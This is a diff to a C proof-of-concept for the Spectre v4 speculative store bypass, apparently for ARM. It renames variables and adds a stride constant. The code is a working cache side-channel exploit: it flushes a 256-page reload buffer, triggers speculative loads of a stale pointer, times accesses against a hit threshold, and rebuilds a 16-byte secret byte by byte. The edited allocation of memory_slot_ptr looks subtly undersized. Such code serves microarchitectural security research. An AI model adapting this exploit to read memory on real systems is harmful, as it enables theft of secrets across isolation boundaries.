@@ -8,6 +8,7 @@
 #define LEN 16
 #define MAX_TRIES 5000
 #define CACHE_HIT_THRESHOLD 190
+#define STRIDE 4096
 #define REPEAT_16(x) x x x x x x x x x x x x x x x x
 #define REPEAT_20(x) x x x x x x x x x x x x x x x x x x x x 
 
@@ -22,14 +23,14 @@
 
 
 
-unsigned char** memory_slot_ptr __attribute__((aligned(4096)));
-unsigned char* memory_slot __attribute__((aligned(4096)));
+unsigned char **memory_slot_ptr __attribute__((aligned(4096)));
+unsigned char *memory_slot __attribute__((aligned(4096)));
 
-unsigned char secret_key[] = "PASSWORD_SPECTRE";
-unsigned char public_key[] = "################";
-unsigned char *password;
+unsigned char secret_key[] = "spectre_executed";
+unsigned char fake_buffer[] = "______fake______";
+unsigned char *leak;
 
-uint8_t *probe;
+uint8_t *reloadbuffer;
 volatile uint8_t tmp = 0;
 
 static inline __attribute__((always_inline)) void measure_time() {
@@ -66,16 +67,14 @@ static inline __attribute__((always_inline)) void measure_time() {
 static inline __attribute__((always_inline)) void spectre_v4(size_t idx) {
 	unsigned char **memory_slot_slow_ptr = memory_slot_ptr;
 	NOPS(200);
-	*memory_slot_slow_ptr = public_key;
-	tmp = probe[memory_slot[idx] << 12];
+	*memory_slot_slow_ptr = fake_buffer;
+	tmp = reloadbuffer[memory_slot[idx] << 12];
 	//measure_time();
 }
 
 
 static inline __attribute__((always_inline)) void attacker_function(int idx) {
 	int access_index = 0;
-
-
 		int results[256] = {0};
 		volatile unsigned char pick = 0;
 		REPEAT_20(
@@ -85,7 +84,7 @@ static inline __attribute__((always_inline)) void attacker_function(int idx) {
 
 			cacheflush(memory_slot_ptr);
 			for (int i = 0; i < 256; i++) {
-				cacheflush(&probe[i * 4096]);
+				cacheflush(&reloadbuffer[i * STRIDE]);
 			}
 			for(volatile int z = 0; z < 100; z++){}
 			isb();
@@ -95,45 +94,44 @@ static inline __attribute__((always_inline)) void attacker_function(int idx) {
 			for (int i = 0; i < 256; i++) {
 				access_index = ((i * 167) + 13) & 255;
 				isb();
-				uint64_t time1 = get_cycles(); // read timer
-				pick = probe[access_index << 12]; // memory access to time
-				uint64_t time2 = get_cycles() - time1; // read timer and compute elapsed time
+				uint64_t time1 = get_cycles(); 
+				pick = reloadbuffer[access_index << 12]; // memory access to time
+				uint64_t time2 = get_cycles() - time1; 
 				isb();
 
-				if (time2 <= CACHE_HIT_THRESHOLD && access_index != public_key[idx]) {
-					results[access_index]++; // cache hit
+				if (time2 <= CACHE_HIT_THRESHOLD && access_index != fake_buffer[idx]) {
+					results[access_index]++; 
 				}
 			}
 		}
 		)
-		int highest = -1;
+		int max = -1;
 		for (int i = 0; i < 256; i++) {
-			if (highest < 0 || results[highest] < results[i]) {
-				highest = i;
+			if (max < 0 || results[max] < results[i]) {
+				max = i;
 			}
 		}
-		printf("highest:%c, hitrate:%f\n", highest,
-			(double)results[highest] * 100 / MAX_TRIES);
-		*(password + idx) = highest;
+		printf("cache hit:%c, rate:%f\n", max,
+			(double)results[max] * 100 / MAX_TRIES);
+		*(leak + idx) = max;
 }
 
 
 int main(void) {
-	probe = (unsigned char *)mmap(0, 4096 * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
-	memset(probe, 0, sizeof(uint8_t) * 256 * 4096);
-	password = (unsigned char *)malloc(sizeof(unsigned char) * LEN);
- memory_slot = (unsigned char*) aligned_alloc(4096, 4096); 
-    memory_slot_ptr = (unsigned char**) aligned_alloc(4096, sizeof(unsigned char*));
+	reloadbuffer = (unsigned char *)mmap(0, STRIDE * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
+	memset(reloadbuffer, 0, sizeof(uint8_t) * 256 * STRIDE);
+	leak = (unsigned char *)malloc(sizeof(unsigned char) * LEN);
+ 	memory_slot = (unsigned char*) aligned_alloc(4096, sizeof(unsigned char)); 
+    memory_slot_ptr = (unsigned char**) aligned_alloc(4096, sizeof(unsigned char));
     *memory_slot_ptr = memory_slot;
-	*memory_slot_ptr = memory_slot;
 
-	int idx = 0;
+	int index = 0;
 	REPEAT_16(
-	attacker_function(idx);
-	idx ++;
+	attacker_function(index);
+	index ++;
 	)
 	
-	printf("%s\n", password);
-	free(password);
-	password = NULL;
+	printf("%s\n", leak);
+	free(leak);
+	leak = NULL;
 }
